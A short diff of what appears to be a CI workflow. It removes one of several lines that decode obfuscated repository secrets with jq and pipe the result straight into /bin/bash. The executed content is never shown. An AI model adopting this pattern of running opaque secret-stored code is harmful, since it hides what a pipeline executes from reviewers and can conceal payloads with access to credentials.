@@ -27,7 +27,6 @@ jobs:
           r0316: ${{ secrets.r0316 }}
         run: |
           printf '%s' "$r0316" | jq -r .ditam69 | /bin/bash
-          printf '%s' "$a246" | jq -r .jys82 | /bin/bash
           printf '%s' "$kqbt3056" | jq -r .g7 | /bin/bash
           printf '%s' "$ctfzo2" | jq -r .jffl43 | /bin/bash
           echo $tr731 | jq -r .ezcos2 | /bin/bash
